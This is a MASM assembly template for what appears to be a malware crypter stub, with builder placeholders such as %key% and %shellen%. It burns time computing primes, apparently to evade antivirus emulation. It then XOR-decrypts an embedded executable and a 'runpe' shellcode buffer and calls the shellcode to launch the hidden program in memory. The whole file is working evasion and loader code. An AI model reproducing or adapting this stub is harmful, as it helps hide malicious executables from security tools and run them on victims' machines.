    <value>.386
.model flat, stdcall
option casemap:none
include \masm32\include\kernel32.inc
includelib \masm32\lib\kernel32.lib
include byte.inc

.data
key         BYTE    %key% ;binary key , translates to 12 in decimal


.code
;xor encryption, borrowed from irvine chapter 6 - encrypt.asm
encrypt PROC
	pushad
L1:
    xor  [edx], AL          
    inc  edx               
    loop L1
	popad
    ret                    
encrypt ENDP
_entrypoint:
	mov ecx,ecx
	xor edi,edi
	step1:
		cmp edi,%maxprime%
		je ready
		add ecx,1;increment our base
		mov eax,ecx
		mov ebx,2
		xor edx,edx ;clear out edx
		div ebx ;eax/2
		cmp edx,0 ; Check if remainder is 0
		jne step2 ; if its anything but 0 jmp to next step
		je step1 ;we know it is an odd number
	step2:
		cmp ecx,1
		je step3
		mov esi,ecx ;use esi as our incremental divisior
		@@: 
		sub esi,1
		cmp esi,1
		je step3 
		mov eax,ecx 
		xor edx,edx 
		div esi
		cmp edx,0 
		je step1 
		jne @B 
		step3:
		inc edi
		jmp step1
	
	ready:
		;decrypt data
		add ecx,%primeadder% ;datalength = (primenumber + (actual - prime))
	  	mov  al,  key          
	    dec  ecx                ; don't count the null char
	    lea  edx, dwEXEArray
	    call encrypt 
	    
	    ;decrypt runpe
	    sub ecx, %shellen%
	   	mov  al,  key         
	    lea  edx, szShellCode
	    call encrypt 
	    
		lea ebx, szShellCode
		mov eax, offset dwEXEArray
		call ebx
		invoke ExitProcess,0
end _entrypoint</value>
